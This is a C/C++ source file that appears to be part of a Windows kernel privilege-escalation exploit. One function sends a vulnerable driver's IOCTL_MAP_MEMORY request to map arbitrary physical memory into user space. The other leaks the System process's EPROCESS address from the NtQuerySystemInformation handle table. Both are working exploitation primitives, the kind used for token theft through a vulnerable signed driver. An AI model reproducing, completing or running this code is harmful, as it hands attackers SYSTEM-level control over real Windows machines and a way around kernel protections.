#include "memory.h"
#include "utils.h"

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0 && (NTSTATUS)(Status) <= 0x7FFFFFFF)

ULONG64 driverMmMap(HANDLE hDriver, ULONG64 addr, DWORD size = 0x1000) {
    DWORD index = 0;
    DWORD bytesWritten = 0;

    PINPUT_BUFFER pInBuffer = (PINPUT_BUFFER)malloc(sizeof(INPUT_BUFFER));
    POUTPUT_BUFFER pOutBuffer = (POUTPUT_BUFFER)malloc(sizeof(OUTPUT_BUFFER));

    if (NULL == pInBuffer || NULL == pOutBuffer) {
		printf("[-] Failed to allocate memory for input/output buffer\n");
		return 0;
	}

    memset(pInBuffer, 0, sizeof(INPUT_BUFFER));
    memset(pOutBuffer, 0, sizeof(OUTPUT_BUFFER));

    pInBuffer->PhyAddress = addr;
    pInBuffer->Size = size;

#ifdef _DEBUG
    hexdump(pInBuffer, sizeof(INPUT_BUFFER));
#endif

    DeviceIoControl(hDriver, IOCTL_MAP_MEMORY, (LPVOID)pInBuffer, sizeof(INPUT_BUFFER), (LPVOID)pOutBuffer, sizeof(OUTPUT_BUFFER), &bytesWritten, NULL);

#ifdef _DEBUG
    hexdump(pOutBuffer, sizeof(OUTPUT_BUFFER));
#endif
    ULONG64 mapped = pOutBuffer->MappedAddress;

    return mapped;
}


ULONG64 findSystemEPROCESS() {
    ULONG returnLenght = 0;
    HMODULE hNtDll = GetModuleHandleW(L"ntdll");
    if (NULL == hNtDll) {
		printf("[-] Failed to get handle to ntdll\n");
		return 0;
	}

    fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(hNtDll, "NtQuerySystemInformation");
    
    if (NULL == NtQuerySystemInformation) {
        printf("[-] Failed to get address of NtQuerySystemInformation\n");
        return 0;
    }

    PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
    if (NULL == handleTableInformation) {
        printf("[-] Failed to allocate memory for handleTableInformation\n");
        return 0;
    }
    
    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);
    if (!NT_SUCCESS(status)) {
		printf("[-] Failed to get handle table information\n");
		return 0;
	}

    SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[0];
    return (ULONG64)handleInfo.Object;
}
